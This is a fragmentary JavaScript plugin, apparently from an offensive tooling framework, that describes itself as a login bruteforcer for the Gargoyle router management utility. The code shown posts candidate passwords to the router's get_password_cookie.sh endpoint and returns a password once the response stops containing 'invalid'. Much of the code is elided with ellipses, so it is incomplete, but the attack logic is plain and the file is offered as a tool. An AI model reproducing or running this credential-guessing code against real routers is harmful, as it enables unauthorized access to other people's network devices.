...
class Plugin {
    ...
    info(){
        return {
            ...
            description: "Gargoyle Router Management Utility login bruteforcer.",
            authors: [
                "I2rys"
            ],
            references: [],
        ...
        return new Promise(async(resolve)=>{
            ...
            var password = await runJobs(
                ...
                async(password, index, max)=>{
                    var response = await request.post(`${args.url}utility/get_password_cookie.sh`, {
                        headers: {
                    ...
                    if(response.body.indexOf("invalid") === -1){
                        return password
                    }else{
